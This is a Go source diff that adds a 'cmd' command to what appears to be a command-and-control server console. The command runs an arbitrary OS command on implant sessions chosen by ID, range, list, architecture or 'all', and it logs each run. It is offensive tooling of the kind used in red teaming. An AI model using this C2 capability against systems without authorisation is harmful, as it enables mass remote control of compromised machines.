@@ -243,6 +243,90 @@ func init() {
 	}
 	interactCmd.AddCommand(showCmd)
 
+	commandCmd := &grumble.Command{
+		Name:     "cmd",
+		Help:     "run a command across one or more sessions",
+		LongHelp: "Executes a command across one or more sessions based on the filter provided.",
+		Args: func(a *grumble.Args) {
+			a.String("filter", "Filter sessions by ID, range (e.g., '1-5'), comma-separated IDs, 'all', or Arch (e.g., 'Linux')", grumble.Default("-1"))
+			a.StringList("cmd", "OS Command to be executed by the target session")
+		},
+		Run: func(c *grumble.Context) error {
+
+			filterArg := c.Args.String("filter")
+			cmd := c.Args.StringList("cmd")
+			cmdString := strings.Join(cmd, " ")
+
+			operator := "server"
+
+			if server.IsWolfPackExec {
+
+				operator = server.CurrentOperator
+			}
+
+			var ids []int
+
+			// Helper to add session ID if arch matches
+			addSessionIfArchMatches := func(sessionID int, session core.Session) {
+				if strings.EqualFold(filterArg, session.Implant.Arch) || filterArg == "all" {
+					ids = append(ids, sessionID)
+				}
+			}
+			
+			// Determine type of filter
+			if filterArg == "-1" {
+				return fmt.Errorf("no session filter provided")
+			} else if filterArg == "all" || !isNumericFilter(filterArg) {
+				// All sessions or Arch string
+				core.Sessions.Range(func(key, value any) bool {
+					sessionID := key.(int)
+					session := value.(core.Session)
+					addSessionIfArchMatches(sessionID, session)
+					return true
+				})
+			} else if strings.Contains(filterArg, "-") && isNumericRange(filterArg) {
+				// Numeric range, e.g., "5-10"
+				parts := strings.Split(filterArg, "-")
+				start, _ := strconv.Atoi(parts[0])
+				end, _ := strconv.Atoi(parts[1])
+				for i := start; i <= end; i++ {
+					core.Sessions.Range(func(key, value any) bool {
+						if key.(int) == i {
+							ids = append(ids, i)
+							return false
+						}
+						return true
+					})
+				}
+			} else {
+				// Comma-separated list of numbers
+				parts := strings.Split(filterArg, ",")
+				for _, p := range parts {
+					id, err := strconv.Atoi(strings.TrimSpace(p))
+					if err != nil {
+						return fmt.Errorf("invalid session filter: %s", p)
+					}
+					core.Sessions.Range(func(key, value any) bool {
+						if key.(int) == id {
+							ids = append(ids, id)
+							return false
+						}
+						return true
+					})
+				}
+			}
+			// Execute the command for each session
+			for _, id := range ids {
+				core.LogData(operator + " executed on session " + strconv.Itoa(id) + ": cmd " + cmdString)
+				core.CmdExec(id, cmdString, operator)
+			}
+	
+			return nil
+		},
+	}
+
+	interactCmd.AddCommand(commandCmd)
+
 	killCmd := &grumble.Command{
 		Name:     "kill",
 		Help:     "kills a specified session",
@@ -365,4 +449,25 @@ func calculateSessionStatus(updateInterval float64, lastCheckIn time.Time) (bool
 	}
 
 	return true, nil
+}
+
+// Checks if the string is purely numeric (digits, commas, optional single dash)
+func isNumericFilter(s string) bool {
+	for _, c := range s {
+		if !(c >= '0' && c <= '9') && c != ',' && c != '-' {
+			return false
+		}
+	}
+	return true
+}
+
+// Checks if the string is a numeric range like "5-10"
+func isNumericRange(s string) bool {
+	parts := strings.Split(s, "-")
+	if len(parts) != 2 {
+		return false
+	}
+	_, err1 := strconv.Atoi(parts[0])
+	_, err2 := strconv.Atoi(parts[1])
+	return err1 == nil && err2 == nil
 }
